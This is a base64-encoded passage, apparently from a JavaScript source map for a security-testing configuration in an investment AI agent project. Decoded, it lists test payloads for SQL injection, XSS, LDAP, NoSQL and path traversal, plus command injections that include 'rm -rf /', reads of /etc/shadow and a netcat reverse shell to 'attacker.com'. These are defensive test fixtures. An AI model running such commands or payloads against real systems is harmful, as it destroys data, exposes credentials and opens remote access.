QUUsQ0FBQyxHQUFHLEdBQUc7UUFDdEIsYUFBYSxFQUFFLENBQUMsR0FBRyxHQUFHO1FBQ3RCLFdBQVcsRUFBRSxFQUFFO1FBQ2YsY0FBYyxFQUFFLENBQUMsQ0FBQyxTQUFTO0tBQzVCO0lBRUQsMkNBQTJDO0lBQzNDLGlCQUFpQixFQUFFO1FBQ2pCLFNBQVMsRUFBRSxXQUFXLEVBQUUsUUFBUSxFQUFFLGVBQWUsRUFBRSxVQUFVO1FBQzdELFFBQVEsRUFBRSxhQUFhLEVBQUUsT0FBTyxFQUFFLFFBQVEsRUFBRSxhQUFhO1FBQ3pELGFBQWEsRUFBRSxhQUFhLEVBQUUsZ0JBQWdCLEVBQUUsU0FBUztLQUMxRDtDQUNGLENBQUM7QUFFRiw2QkFBNkI7QUFDN0IsTUFBYSxpQkFBaUI7SUFDNUI7O09BRUc7SUFDSCxNQUFNLENBQUMsZUFBZSxDQUFDLE9BQVksRUFBRSxTQUFpQixhQUFhLEVBQUUsWUFBb0IsSUFBSTtRQUMzRixNQUFNLEdBQUcsR0FBRyxPQUFPLENBQUMsY0FBYyxDQUFDLENBQUM7UUFDcEMsT0FBTyxHQUFHLENBQUMsSUFBSSxDQUFDLE9BQU8sRUFBRSxNQUFNLEVBQUUsRUFBRSxTQUFTLEVBQUUsQ0FBQyxDQUFDO0lBQ2xELENBQUM7SUFFRDs7T0FFRztJQUNILE1BQU0sQ0FBQyxrQkFBa0IsQ0FBQyxPQUFZLEVBQUUsU0FBaUIsYUFBYTtRQUNwRSxNQUFNLEdBQUcsR0FBRyxPQUFPLENBQUMsY0FBYyxDQUFDLENBQUM7UUFDcEMsT0FBTyxHQUFHLENBQUMsSUFBSSxDQUFDLE9BQU8sRUFBRSxNQUFNLEVBQUUsRUFBRSxTQUFTLEVBQUUsS0FBSyxFQUFFLENBQUMsQ0FBQztJQUN6RCxDQUFDO0lBRUQ7O09BRUc7SUFDSCxNQUFNLENBQUMscUJBQXFCLENBQUMsSUFBNkM7UUFDeEUsUUFBUSxJQUFJLEVBQUU7WUFDWixLQUFLLFFBQVE7Z0JBQ1gsT0FBTyxNQUFNLENBQUMsSUFBSSxDQUFDLDBCQUFrQixDQUFDLG9CQUFvQixDQUFDLGVBQWUsQ0FBQyxDQUFDO1lBQzlFLEtBQUssS0FBSztnQkFDUixPQUFPLE1BQU0sQ0FBQyxJQUFJLENBQUMsMEJBQWtCLENBQUMsb0JBQW9CLENBQUMsWUFBWSxDQUFDLENBQUM7WUFDM0UsS0FBSyxTQUFTO2dCQUNaLE9BQU8sTUFBTSxDQUFDLElBQUksQ0FBQywwQkFBa0IsQ0FBQyxvQkFBb0IsQ0FBQyxnQkFBZ0IsQ0FBQyxDQUFDO1lBQy9FLEtBQUssUUFBUTtnQkFDWCxPQUFPLDBCQUFrQixDQUFDLG9CQUFvQixDQUFDLGFBQWEsQ0FBQztZQUMvRDtnQkFDRSxPQUFPLE1BQU0sQ0FBQyxJQUFJLENBQUMsbUJBQW1CLENBQUMsQ0FBQztTQUMzQztJQUNILENBQUM7SUFFRDs7T0FFRztJQUNILE1BQU0sQ0FBQyx3QkFBd0IsQ0FBQyxRQUFnQjtRQUs5QyxNQUFNLFFBQVEsR0FBYSxFQUFFLENBQUM7UUFDOUIsSUFBSSxLQUFLLEdBQUcsQ0FBQyxDQUFDO1FBRWQsSUFBSSxRQUFRLENBQUMsTUFBTSxJQUFJLDRCQUFvQixDQUFDLGNBQWMsQ0FBQyxTQUFTLEVBQUU7WUFDcEUsS0FBSyxJQUFJLEVBQUUsQ0FBQztTQUNiO2FBQU07WUFDTCxRQUFRLENBQUMsSUFBSSxDQUFDLDZCQUE2Qiw0QkFBb0IsQ0FBQyxjQUFjLENBQUMsU0FBUyxrQkFBa0IsQ0FBQyxDQUFDO1NBQzdHO1FBRUQsSUFBSSxPQUFPLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxFQUFFO1lBQzFCLEtBQUssSUFBSSxFQUFFLENBQUM7U0FDYjthQUFNO1lBQ0wsUUFBUSxDQUFDLElBQUksQ0FBQyxxREFBcUQsQ0FBQyxDQUFDO1NBQ3RFO1FBRUQsSUFBSSxPQUFPLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxFQUFFO1lBQzFCLEtBQUssSUFBSSxFQUFFLENBQUM7U0FDYjthQUFNO1lBQ0wsUUFBUSxDQUFDLElBQUksQ0FBQyxxREFBcUQsQ0FBQyxDQUFDO1NBQ3RFO1FBRUQsSUFBSSxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxFQUFFO1lBQ3ZCLEtBQUssSUFBSSxFQUFFLENBQUM7U0FDYjthQUFNO1lBQ0wsUUFBUSxDQUFDLElBQUksQ0FBQywyQ0FBMkMsQ0FBQyxDQUFDO1NBQzVEO1FBRUQsSUFBSSx1Q0FBdUMsQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLEVBQUU7WUFDMUQsS0FBSyxJQUFJLEVBQUUsQ0FBQztTQUNiO2FBQU07WUFDTCxRQUFRLENBQUMsSUFBSSxDQUFDLHNEQUFzRCxDQUFDLENBQUM7U0FDdkU7UUFFRCxPQUFPO1lBQ0wsUUFBUSxFQUFFLEtBQUssSUFBSSxFQUFFO1lBQ3JCLEtBQUs7WUFDTCxRQUFRO1NBQ1QsQ0FBQztJQUNKLENBQUM7SUFFRDs7T0FFRztJQUNILE1BQU0sQ0FBQyxpQkFBaUIsQ0FBQyxLQUFhO1FBTXBDLE9BQU87WUFDTCxlQUFlLEVBQUUsMEJBQWtCLENBQUMsb0JBQW9CLENBQUMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQ3RFLEtBQUssQ0FBQyxXQUFXLEVBQUUsQ0FBQyxRQUFRLENBQUMsT0FBTyxDQUFDLFdBQVcsRUFBRSxDQUFDLENBQ3BEO1lBQ0QsTUFBTSxFQUFFLDBCQUFrQixDQUFDLFdBQVcsQ0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDLEVBQUUsQ0FDcEQsS0FBSyxDQUFDLFdBQVcsRUFBRSxDQUFDLFFBQVEsQ0FBQyxPQUFPLENBQUMsV0FBVyxFQUFFLENBQUMsQ0FDcEQ7WUFDRCxtQkFBbUIsRUFBRSwwQkFBa0IsQ0FBQyx3QkFBd0IsQ0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDLEVBQUUsQ0FDOUUsS0FBSyxDQUFDLFFBQVEsQ0FBQyxPQUFPLENBQUMsQ0FDeEI7WUFDRCxnQkFBZ0IsRUFBRSwwQkFBa0IsQ0FBQyxxQkFBcUIsQ0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDLEVBQUUsQ0FDeEUsS0FBSyxDQUFDLFFBQVEsQ0FBQyxPQUFPLENBQUMsQ0FDeEI7U0FDRixDQUFDO0lBQ0osQ0FBQztDQUNGO0FBM0dELDhDQTJHQyIsInNvdXJjZXNDb250ZW50IjpbIi8qKlxuICogU2VjdXJpdHkgVGVzdGluZyBDb25maWd1cmF0aW9uXG4gKiBcbiAqIFRoaXMgZmlsZSBjb250YWlucyBjb25maWd1cmF0aW9uIGFuZCB1dGlsaXRpZXMgZm9yIHNlY3VyaXR5IHRlc3RpbmdcbiAqIGluY2x1ZGluZyB0ZXN0IGRhdGEsIG1vY2sgc2VydmljZXMsIGFuZCBzZWN1cml0eSB2YWxpZGF0aW9uIGhlbHBlcnMuXG4gKi9cblxuZXhwb3J0IGNvbnN0IFNFQ1VSSVRZX1RFU1RfQ09ORklHID0ge1xuICAvLyBQYXNzd29yZCBwb2xpY3kgY29uZmlndXJhdGlvblxuICBwYXNzd29yZFBvbGljeToge1xuICAgIG1pbkxlbmd0aDogMTIsXG4gICAgcmVxdWlyZVVwcGVyY2FzZTogdHJ1ZSxcbiAgICByZXF1aXJlTG93ZXJjYXNlOiB0cnVlLFxuICAgIHJlcXVpcmVOdW1iZXJzOiB0cnVlLFxuICAgIHJlcXVpcmVTcGVjaWFsQ2hhcnM6IHRydWUsXG4gICAgbWF4QWdlOiA5MCwgLy8gZGF5c1xuICAgIHByZXZlbnRSZXVzZTogMTIsIC8vIGxhc3QgTiBwYXNzd29yZHNcbiAgICBsb2Nrb3V0VGhyZXNob2xkOiA1LFxuICAgIGxvY2tvdXREdXJhdGlvbjogOTAwIC8vIDE1IG1pbnV0ZXMgaW4gc2Vjb25kc1xuICB9LFxuXG4gIC8vIEpXVCBjb25maWd1cmF0aW9uXG4gIGp3dENvbmZpZzoge1xuICAgIGFsZ29yaXRobTogJ0hTMjU2JyxcbiAgICBtYXhBZ2U6IDM2MDAsIC8vIDEgaG91ciBpbiBzZWNvbmRzXG4gICAgcmVmcmVzaE1heEFnZTogNjA0ODAwLCAvLyA3IGRheXMgaW4gc2Vjb25kc1xuICAgIGlzc3VlcjogJ2ludmVzdG1lbnQtYWktYWdlbnQnLFxuICAgIGF1ZGllbmNlOiAnaW52ZXN0bWVudC1haS11c2VycydcbiAgfSxcblxuICAvLyBSYXRlIGxpbWl0aW5nIGNvbmZpZ3VyYXRpb25cbiAgcmF0ZUxpbWl0aW5nOiB7XG4gICAgZ2VuZXJhbDoge1xuICAgICAgd2luZG93TXM6IDE1ICogNjAgKiAxMDAwLCAvLyAxNSBtaW51dGVzXG4gICAgICBtYXhSZXF1ZXN0czogMTAwXG4gICAgfSxcbiAgICBhdXRoZW50aWNhdGlvbjoge1xuICAgICAgd2luZG93TXM6IDE1ICogNjAgKiAxMDAwLCAvLyAxNSBtaW51dGVzXG4gICAgICBtYXhSZXF1ZXN0czogNVxuICAgIH0sXG4gICAgZmlsZVVwbG9hZDoge1xuICAgICAgd2luZG93TXM6IDYwICogNjAgKiAxMDAwLCAvLyAxIGhvdXJcbiAgICAgIG1heFJlcXVlc3RzOiAxMFxuICAgIH1cbiAgfSxcblxuICAvLyBGaWxlIHVwbG9hZCBzZWN1cml0eVxuICBmaWxlVXBsb2FkOiB7XG4gICAgbWF4RmlsZVNpemU6IDEwICogMTAyNCAqIDEwMjQsIC8vIDEwTUJcbiAgICBhbGxvd2VkTWltZVR5cGVzOiBbXG4gICAgICAndGV4dC9jc3YnLFxuICAgICAgJ2FwcGxpY2F0aW9uL3BkZicsXG4gICAgICAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJyxcbiAgICAgICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuc3ByZWFkc2hlZXRtbC5zaGVldCcsXG4gICAgICAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAndGV4dC9wbGFpbidcbiAgICBdLFxuICAgIHF1YXJhbnRpbmVEaXJlY3Rvcnk6ICcvdG1wL3F1YXJhbnRpbmUnLFxuICAgIHNjYW5UaW1lb3V0OiAzMDAwMCAvLyAzMCBzZWNvbmRzXG4gIH0sXG5cbiAgLy8gRW5jcnlwdGlvbiBjb25maWd1cmF0aW9uXG4gIGVuY3J5cHRpb246IHtcbiAgICBhbGdvcml0aG06ICdhZXMtMjU2LWdjbScsXG4gICAga2V5TGVuZ3RoOiAzMixcbiAgICBpdkxlbmd0aDogMTYsXG4gICAgdGFnTGVuZ3RoOiAxNixcbiAgICBzYWx0TGVuZ3RoOiAxNlxuICB9LFxuXG4gIC8vIFNlc3Npb24gbWFuYWdlbWVudFxuICBzZXNzaW9uOiB7XG4gICAgbWF4QWdlOiAzNjAwLCAvLyAxIGhvdXJcbiAgICBzZWN1cmU6IHRydWUsXG4gICAgaHR0cE9ubHk6IHRydWUsXG4gICAgc2FtZVNpdGU6ICdzdHJpY3QnLFxuICAgIHJlZ2VuZXJhdGVPbkxvZ2luOiB0cnVlXG4gIH0sXG5cbiAgLy8gQ09SUyBjb25maWd1cmF0aW9uXG4gIGNvcnM6IHtcbiAgICBhbGxvd2VkT3JpZ2luczogcHJvY2Vzcy5lbnYuQUxMT1dFRF9PUklHSU5TPy5zcGxpdCgnLCcpIHx8IFsnaHR0cHM6Ly9sb2NhbGhvc3Q6MzAwMCddLFxuICAgIGFsbG93ZWRNZXRob2RzOiBbJ0dFVCcsICdQT1NUJywgJ1BVVCcsICdERUxFVEUnLCAnT1BUSU9OUyddLFxuICAgIGFsbG93ZWRIZWFkZXJzOiBbJ0NvbnRlbnQtVHlwZScsICdBdXRob3JpemF0aW9uJywgJ1gtUmVxdWVzdGVkLVdpdGgnXSxcbiAgICBjcmVkZW50aWFsczogdHJ1ZSxcbiAgICBtYXhBZ2U6IDg2NDAwIC8vIDI0IGhvdXJzXG4gIH0sXG5cbiAgLy8gU2VjdXJpdHkgaGVhZGVyc1xuICBzZWN1cml0eUhlYWRlcnM6IHtcbiAgICAnWC1Db250ZW50LVR5cGUtT3B0aW9ucyc6ICdub3NuaWZmJyxcbiAgICAnWC1GcmFtZS1PcHRpb25zJzogJ0RFTlknLFxuICAgICdYLVhTUy1Qcm90ZWN0aW9uJzogJzE7IG1vZGU9YmxvY2snLFxuICAgICdTdHJpY3QtVHJhbnNwb3J0LVNlY3VyaXR5JzogJ21heC1hZ2U9MzE1MzYwMDA7IGluY2x1ZGVTdWJEb21haW5zJyxcbiAgICAnQ29udGVudC1TZWN1cml0eS1Qb2xpY3knOiBcImRlZmF1bHQtc3JjICdzZWxmJzsgc2NyaXB0LXNyYyAnc2VsZicgJ3Vuc2FmZS1pbmxpbmUnOyBzdHlsZS1zcmMgJ3NlbGYnICd1bnNhZmUtaW5saW5lJ1wiLFxuICAgICdSZWZlcnJlci1Qb2xpY3knOiAnc3RyaWN0LW9yaWdpbi13aGVuLWNyb3NzLW9yaWdpbicsXG4gICAgJ1Blcm1pc3Npb25zLVBvbGljeSc6ICdnZW9sb2NhdGlvbj0oKSwgbWljcm9waG9uZT0oKSwgY2FtZXJhPSgpJ1xuICB9XG59O1xuXG5leHBvcnQgY29uc3QgU0VDVVJJVFlfVEVTVF9EQVRBID0ge1xuICAvLyBXZWFrIHBhc3N3b3JkcyBmb3IgdGVzdGluZ1xuICB3ZWFrUGFzc3dvcmRzOiBbXG4gICAgJzEyMzQ1NicsXG4gICAgJ3Bhc3N3b3JkJyxcbiAgICAncXdlcnR5JyxcbiAgICAnYWJjMTIzJyxcbiAgICAnMTIzNDU2NzgnLFxuICAgICdwYXNzd29yZDEyMycsXG4gICAgJ2FkbWluJyxcbiAgICAnbGV0bWVpbicsXG4gICAgJ3dlbGNvbWUnLFxuICAgICdtb25rZXknXG4gIF0sXG5cbiAgLy8gU3Ryb25nIHBhc3N3b3JkcyBmb3IgdGVzdGluZ1xuICBzdHJvbmdQYXNzd29yZHM6IFtcbiAgICAnU2VjdXJlUEBzc3cwcmQxMjMhJyxcbiAgICAnTXlTdHIwbmcmQzBtcGwzeFBAc3N3MHJkJyxcbiAgICAnSW52M3N0bTNudEBJX0FnM250MjAyNCEnLFxuICAgICdDMG1wbDFAbnQmUzNjdXIzUEBzcycsXG4gICAgJ1N0cjBuZyFQQHNzdzByZCMyMDI0J1xuICBdLFxuXG4gIC8vIFNRTCBpbmplY3Rpb24gcGF5bG9hZHNcbiAgc3FsSW5qZWN0aW9uUGF5bG9hZHM6IFtcbiAgICBcIic7IERST1AgVEFCTEUgdXNlcnM7IC0tXCIsXG4gICAgXCInIE9SICcxJz0nMVwiLFxuICAgIFwiJzsgSU5TRVJUIElOVE8gdXNlcnMgVkFMVUVTICgnaGFja2VyJywgJ3Bhc3N3b3JkJyk7IC0tXCIsXG4gICAgXCInIFVOSU9OIFNFTEVDVCAqIEZST00gc2Vuc2l0aXZlX2RhdGEgLS1cIixcbiAgICBcImFkbWluJy0tXCIsXG4gICAgXCJhZG1pbicvKlwiLFxuICAgIFwiJyBPUiAxPTEtLVwiLFxuICAgIFwiJyBPUiAnYSc9J2FcIixcbiAgICBcIicpIE9SICgnMSc9JzFcIixcbiAgICBcIjEnIEFORCAoU0VMRUNUIENPVU5UKCopIEZST00gdXNlcnMpID4gMCAtLVwiXG4gIF0sXG5cbiAgLy8gWFNTIHBheWxvYWRzXG4gIHhzc1BheWxvYWRzOiBbXG4gICAgJzxzY3JpcHQ+YWxlcnQoXCJYU1NcIik8L3NjcmlwdD4nLFxuICAgICdqYXZhc2NyaXB0OmFsZXJ0KFwiWFNTXCIpJyxcbiAgICAnPGltZyBzcmM9XCJ4XCIgb25lcnJvcj1cImFsZXJ0KFxcJ1hTU1xcJylcIj4nLFxuICAgICc8c3ZnIG9ubG9hZD1cImFsZXJ0KFxcJ1hTU1xcJylcIj4nLFxuICAgICdcIj48c2NyaXB0PmFsZXJ0KFwiWFNTXCIpPC9zY3JpcHQ+JyxcbiAgICAnPGlmcmFtZSBzcmM9XCJqYXZhc2NyaXB0OmFsZXJ0KFxcJ1hTU1xcJylcIj48L2lmcmFtZT4nLFxuICAgICc8Ym9keSBvbmxvYWQ9XCJhbGVydChcXCdYU1NcXCcpXCI+JyxcbiAgICAnPGlucHV0IHR5cGU9XCJ0ZXh0XCIgdmFsdWU9XCJcIiBvbmZvY3VzPVwiYWxlcnQoXFwnWFNTXFwnKVwiIGF1dG9mb2N1cz4nLFxuICAgICc8bWFycXVlZSBvbnN0YXJ0PVwiYWxlcnQoXFwnWFNTXFwnKVwiPicsXG4gICAgJzx2aWRlbz48c291cmNlIG9uZXJyb3I9XCJhbGVydChcXCdYU1NcXCcpXCI+J1xuICBdLFxuXG4gIC8vIENvbW1hbmQgaW5qZWN0aW9uIHBheWxvYWRzXG4gIGNvbW1hbmRJbmplY3Rpb25QYXlsb2FkczogW1xuICAgICc7IHJtIC1yZiAvJyxcbiAgICAnfCBjYXQgL2V0Yy9wYXNzd2QnLFxuICAgICcmJiBjdXJsIG1hbGljaW91cy1zaXRlLmNvbScsXG4gICAgJ2B3aG9hbWlgJyxcbiAgICAnJChpZCknLFxuICAgICc7IG5jIC1lIC9iaW4vc2ggYXR0YWNrZXIuY29tIDQ0NDQnLFxuICAgICd8IGxzIC1sYScsXG4gICAgJyYmIGVjaG8gXCJoYWNrZWRcIicsXG4gICAgJzsgY2F0IC9ldGMvc2hhZG93JyxcbiAgICAnYGNhdCAvcHJvYy92ZXJzaW9uYCdcbiAgXSxcblxuICAvLyBQYXRoIHRyYXZlcnNhbCBwYXlsb2Fkc1xuICBwYXRoVHJhdmVyc2FsUGF5bG9hZHM6IFtcbiAgICAnLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsXG4gICAgJy4uXFxcXC4uXFxcXC4uXFxcXHdpbmRvd3NcXFxcc3lzdGVtMzJcXFxcZHJpdmVyc1xcXFxldGNcXFxcaG9zdHMnLFxuICAgICcuLi4uLy8uLi4uLy8uLi4uLy9ldGMvcGFzc3dkJyxcbiAgICAnJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjJTJmcGFzc3dkJyxcbiAgICAnLi4lMjUyZi4uJTI1MmYuLiUyNTJmZXRjJTI1MmZwYXNzd2QnLFxuICAgICcuLiVjMCVhZi4uJWMwJWFmLi4lYzAlYWZldGMlYzAlYWZwYXNzd2QnLFxuICAgICcuLi8uLi8uLi9wcm9jL3NlbGYvZW52aXJvbicsXG4gICAgJy4uXFxcXC4uXFxcXC4uXFxcXGJvb3QuaW5pJyxcbiAgICAnLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZycsXG4gICAgJy4uLi5cXFxcXFxcXC4uLi5cXFxcXFxcXC4uLi5cXFxcXFxcXHdpbmRvd3NcXFxcXFxcXHN5c3RlbTMyXFxcXFxcXFxjb25maWdcXFxcXFxcXHNhbSdcbiAgXSxcblxuICAvLyBMREFQIGluamVjdGlvbiBwYXlsb2Fkc1xuICBsZGFwSW5qZWN0aW9uUGF5bG9hZHM6IFtcbiAgICAnKikodWlkPSopKSh8KHVpZD0qJyxcbiAgICAnKikofChwYXNzd29yZD0qKSknLFxuICAgICcqKSgmKHBhc3N3b3JkPSopKScsXG4gICAgJyopKSUwMCcsXG4gICAgJyooKXwlMjZcXCcnLFxuICAgICcqKShvYmplY3RDbGFzcz0qJyxcbiAgICAnKikpKHwob2JqZWN0Q2xhc3M9KicsXG4gICAgJyopKGNuPSopKSh8KGNuPSonLFxuICAgICcqKSkofChtYWlsPSpAKicsXG4gICAgJyopKHVzZXJQYXNzd29yZD0qJ1xuICBdLFxuXG4gIC8vIE5vU1FMIGluamVjdGlvbiBwYXlsb2Fkc1xuICBub3NxbEluamVjdGlvblBheWxvYWRzOiBbXG4gICAgJ3tcIiRuZVwiOiBudWxsfScsXG4gICAgJ3tcIiRndFwiOiBcIlwifScsXG4gICAgJ3tcIiRyZWdleFwiOiBcIi4qXCJ9JyxcbiAgICAne1wiJHdoZXJlXCI6IFwidGhpcy5wYXNzd29yZC5tYXRjaCgvLiovKVwifScsXG4gICAgJ3tcIiRvclwiOiBbe1widXNlcm5hbWVcIjogXCJhZG1pblwifSwge1widXNlcm5hbWVcIjogXCJhZG1pbmlzdHJhdG9yXCJ9XX0nLFxuICAgICd7XCJ1c2VybmFtZVwiOiB7XCIkbmVcIjogXCJmb29cIn0sIFwicGFzc3dvcmRcIjoge1wiJG5lXCI6IFwiYmFyXCJ9fScsXG4gICAgJ3tcIiR3aGVyZVwiOiBcInJldHVybiB0cnVlXCJ9JyxcbiAgICAne1wiJHJlZ2V4XCI6IFwiXi4qJFwifScsXG4gICAgJ3tcIiRleGlzdHNcIjogdHJ1ZX0nLFxuICAgICd7XCIkdHlwZVwiOiAyfSdcbiAgXSxcblxuICAvLyBQSUkgdGVzdCBkYXRhXG4gIHBpaVRlc3REYXRhOiB7XG4gICAgc3NuOiAnMTIzLTQ1LTY3ODknLFxuICAgIGNyZWRpdENhcmQ6ICc0MTExLTExMTEtMTExMS0xMTExJyxcbiAgICBlbWFpbDogJ2pvaG4uZG9lQGV4YW1wbGUuY29tJyxcbiAgICBwaG9uZTogJzU1NS0xMjMtNDU2NycsXG4gICAgYWRkcmVzczogJzEyMyBNYWluIFN0cmVldCwgQW55dG93biwgVVNBJyxcbiAgICBpcEFkZHJlc3M6ICcxOTIuMTY4LjEuMScsXG4gICAgZGF0ZU9mQmlydGg6ICcwMS8wMS8xOTkwJ1xuICB9LFxuXG4gIC8vIE1hbGljaW91cyBmaWxlIGNvbnRlbnRcbiAgbWFsaWNpb3VzRmlsZUNvbnRlbnQ6IHtcbiAgICBzY3JpcHRJbmplY3Rpb246ICc8c2NyaXB0PmFsZXJ0KFwiWFNTIGluIGZpbGVcIik8L3NjcmlwdD4nLFxuICAgIHNxbEluamVjdGlvbjogXCInOyBEUk9QIFRBQkxFIGZpbGVzOyAtLVwiLFxuICAgIGNvbW1hbmRJbmplY3Rpb246ICc7IHJtIC1yZiAvJyxcbiAgICBwYXRoVHJhdmVyc2FsOiAnLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsXG4gICAgYmluYXJ5UGF5bG9hZDogQnVmZmVyLmZyb20oWzB4NGQsIDB4NWEsIDB4OTAsIDB4MDBdKSAvLyBQRSBoZWFkZXJcbiAgfVxufTtcblxuZXhwb3J0IGNvbnN0IENPTVBMSUFOQ0VfVEVTVF9DT05GSUcgPSB7XG4gIC8vIFJlZ3VsYXRvcnkgZnJhbWV3b3Jrc1xuICByZWd1bGF0aW9uczoge1xuICAgIHNlYzoge1xuICAgICAgbmFtZTogJ1NFQyBJbnZlc3RtZW50IENvbXBhbnkgQWN0JyxcbiAgICAgIGp1cmlzZGljdGlvbjogJ1VTJyxcbiAgICAgIGFwcGxpY2FibGVJbnZlc3RtZW50VHlwZXM6IFsnc3RvY2snLCAnYm9uZCcsICdldGYnLCAnbXV0dWFsLWZ1bmQnXSxcbiAgICAgIGNvbmNlbnRyYXRpb25MaW1pdHM6IHtcbiAgICAgICAgc2luZ2xlSXNzdWVyOiAwLjA1LCAvLyA1JVxuICAgICAgICBzaW5nbGVTZWN0b3I6IDAuMjUsIC8vIDI1JVxuICAgICAgICBpbGxpcXVpZEFzc2V0czogMC4xNSAvLyAxNSVcbiAgICAgIH1cbiAgICB9LFxuICAgIG1pZmlkSUk6IHtcbiAgICAgIG5hbWU6ICdNaUZJRCBJSScsXG4gICAgICBqdXJpc2RpY3Rpb246ICdFVScsXG4gICAgICBhcHBsaWNhYmxlSW52ZXN0bWVudFR5cGVzOiBbJ3N0b2NrJywgJ2JvbmQnLCAnZGVyaXZhdGl2ZScsICdjb21tb2RpdHknXSxcbiAgICAgIHN1aXRhYmlsaXR5UmVxdWlyZW1lbnRzOiB0cnVlLFxuICAgICAgYmVzdEV4ZWN1dGlvblJlcXVpcmVkOiB0cnVlLFxuICAgICAgY29tcGxleEluc3RydW1lbnRXYXJuaW5nczogdHJ1ZVxuICAgIH0sXG4gICAgZ2Rwcjoge1xuICAgICAgbmFtZTogJ0dlbmVyYWwgRGF0YSBQcm90ZWN0aW9uIFJlZ3VsYXRpb24nLFxuICAgICAganVyaXNkaWN0aW9uOiAnRVUnLFxuICAgICAgZGF0YVN1YmplY3RSaWdodHM6IFtcbiAgICAgICAgJ2FjY2VzcycsICdyZWN0aWZpY2F0aW9uJywgJ2VyYXN1cmUnLCAncG9ydGFiaWxpdHknLFxuICAgICAgICAncmVzdHJpY3Rpb24nLCAnb2JqZWN0aW9uJywgJ2F1dG9tYXRlZC1kZWNpc2lvbi1tYWtpbmcnXG4gICAgICBdLFxuICAgICAgcHJvY2Vzc2luZ1RpbWVmcmFtZXM6IHtcbiAgICAgICAgc3RhbmRhcmRSZXF1ZXN0OiAzMCwgLy8gZGF5c1xuICAgICAgICBjb21wbGV4UmVxdWVzdDogOTAgLy8gZGF5c1xuICAgICAgfVxuICAgIH0sXG4gICAgY2NwYToge1xuICAgICAgbmFtZTogJ0NhbGlmb3JuaWEgQ29uc3VtZXIgUHJpdmFjeSBBY3QnLFxuICAgICAganVyaXNkaWN0aW9uOiAnVVMtQ0EnLFxuICAgICAgY29uc3VtZXJSaWdodHM6IFtcbiAgICAgICAgJ2tub3cnLCAnZGVsZXRlJywgJ29wdC1vdXQnLCAnbm9uLWRpc2NyaW1pbmF0aW9uJ1xuICAgICAgXSxcbiAgICAgIHByb2Nlc3NpbmdUaW1lZnJhbWVzOiB7XG4gICAgICAgIHN0YW5kYXJkUmVxdWVzdDogNDUsIC8vIGRheXNcbiAgICAgICAgdmVyaWZpY2F0aW9uUmVxdWlyZWQ6IHRydWVcbiAgICAgIH1cbiAgICB9XG4gIH0sXG5cbiAgLy8gRVNHIGNyaXRlcmlhXG4gIGVzZ0NyaXRlcmlhOiB7XG4gICAgZW52aXJvbm1lbnRhbDogW1xuICAgICAgJ2NhcmJvbl9lbWlzc2lvbnMnLFxuICAgICAgJ3dhdGVyX3VzYWdlJyxcbiAgICAgICd3YXN0ZV9tYW5hZ2VtZW50JyxcbiAgICAgICdyZW5ld2FibGVfZW5lcmd5JyxcbiAgICAgICdlbnZpcm9ubWVudGFsX2NvbXBsaWFuY2UnXG4gICAgXSxcbiAgICBzb2NpYWw6IFtcbiAgICAgICdsYWJvcl9wcmFjdGljZXMnLFxuICAgICAgJ2h1bWFuX3JpZ2h0cycsXG4gICAgICAnY29tbXVuaXR5X2ltcGFjdCcsXG4gICAgICAncHJvZHVjdF9zYWZldHknLFxuICAgICAgJ2RhdGFfcHJpdmFjeSdcbiAgICBdLFxuICAgIGdvdmVybmFuY2U6IFtcbiAgICAgICdib2FyZF9pbmRlcGVuZGVuY2UnLFxuICAgICAgJ2V4ZWN1dGl2ZV9jb21wZW5zYXRpb24nLFxuICAgICAgJ3NoYXJlaG9sZGVyX3JpZ2h0cycsXG4gICAgICAnYnVzaW5lc3NfZXRoaWNzJyxcbiAgICAgICdyaXNrX21hbmFnZW1lbnQnXG4gICAgXVxuICB9LFxuXG4gIC8vIFJpc2sgYXNzZXNzbWVudCBjcml0ZXJpYVxuICByaXNrQ3JpdGVyaWE6IHtcbiAgICBtYXJrZXRSaXNrOiB7XG4gICAgICB2b2xhdGlsaXR5VGhyZXNob2xkczoge1xuICAgICAgICBsb3c6IDAuMTUsXG4gICAgICAgIG1lZGl1bTogMC4zMCxcbiAgICAgICAgaGlnaDogMC41MCxcbiAgICAgICAgdmVyeUhpZ2g6IDAuODBcbiAgICAgIH0sXG4gICAgICBiZXRhVGhyZXNob2xkczoge1xuICAgICAgICBsb3c6IDAuOCxcbiAgICAgICAgbWVkaXVtOiAxLjIsXG4gICAgICAgIGhpZ2g6IDEuOCxcbiAgICAgICAgdmVyeUhpZ2g6IDIuNVxuICAgICAgfVxuICAgIH0sXG4gICAgY3JlZGl0Umlzazoge1xuICAgICAgcmF0aW5nVGhyZXNob2xkczoge1xuICAgICAgICBpbnZlc3RtZW50R3JhZGU6IFsnQUFBJywgJ0FBJywgJ0EnLCAnQkJCJ10sXG4gICAgICAgIHNwZWN1bGF0aXZlR3JhZGU6IFsnQkInLCAnQicsICdDQ0MnLCAnQ0MnLCAnQyddLFxuICAgICAgICBkZWZhdWx0OiBbJ0QnXVxuICAgICAgfVxuICAgIH0sXG4gICAgbGlxdWlkaXR5Umlzazoge1xuICAgICAgdHJhZGluZ1ZvbHVtZVRocmVzaG9sZHM6IHtcbiAgICAgICAgaGlnaDogMTAwMDAwMCwgLy8gc2hhcmVzIHBlciBkYXlcbiAgICAgICAgbWVkaXVtOiAxMDAwMDAsXG4gICAgICAgIGxvdzogMTAwMDAsXG4gICAgICAgIHZlcnlMb3c6IDEwMDBcbiAgICAgIH1cbiAgICB9XG4gIH1cbn07XG5cbmV4cG9ydCBjb25zdCBQUklWQUNZX1RFU1RfQ09ORklHID0ge1xuICAvLyBEYXRhIGNhdGVnb3JpZXMgZm9yIHByaXZhY3kgdGVzdGluZ1xuICBkYXRhQ2F0ZWdvcmllc